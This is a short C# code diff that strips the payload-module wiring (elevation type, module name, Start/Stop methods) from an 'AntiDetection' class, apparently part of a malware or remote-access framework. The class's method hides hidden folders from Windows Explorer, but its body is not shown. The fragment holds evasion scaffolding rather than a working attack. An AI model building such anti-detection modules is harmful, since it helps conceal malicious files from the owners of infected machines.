@@ -9,23 +9,8 @@ using System.Threading.Tasks;
 
 namespace zort
 {
-    public class AntiDetection : IPayloadModule
+    public class AntiDetection
     {
-        public ElevationType ElevationType => ElevationType.Both;
-
-        public string ModuleName => "AntiDetection";
-
-        public void Start()
-        {
-            HideHiddenFoldersFromExplorer();
-            ModuleLogger.Log(this, "Hidden files are now hidden from explorer.");
-        }
-
-        public void Stop()
-        {
-            // No need to stop anything
-        }
-
         public static void HideHiddenFoldersFromExplorer()
         {
             try
